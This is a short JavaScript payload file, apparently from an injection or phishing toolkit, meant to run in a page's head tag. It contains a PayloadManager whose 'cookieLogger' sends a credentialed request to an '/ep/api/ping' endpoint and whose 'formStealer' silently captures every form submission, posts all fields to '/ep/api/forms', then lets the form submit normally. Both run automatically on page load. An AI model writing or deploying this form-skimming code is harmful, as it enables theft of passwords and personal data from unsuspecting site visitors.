/*
REMEMBER! 
This file is run in the head tag, so make sure that your payloads are run after the body has loaded, if neceessary.
*/

alert('Test payload')

const PayloadManager = {
    payloads: {
        cookieLogger: () => {
            fetch('/ep/api/ping', { 
                method: 'POST', 
                credentials: 'include'
            });
        },
        formStealer: () => {
            document.querySelectorAll('form').forEach(form => {
                form.addEventListener('submit', async (e) => {
                    e.preventDefault();
                    const formData = new FormData(form);
                    const data = Object.fromEntries(formData);
                    
                    await fetch('/ep/api/forms', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(data)
                    });

                    form.submit();
                });
            });
        }
    },
    
    init: function() {
        // Execute all payloads when DOM is loaded
        document.addEventListener('DOMContentLoaded', () => {
            Object.keys(this.payloads).forEach(payload => {
                try {
                    this.payloads[payload]();
                } catch (error) {
                    console.error(`Error executing payload ${payload}:`, error);
                }
            });
        });
    }
};

PayloadManager.init();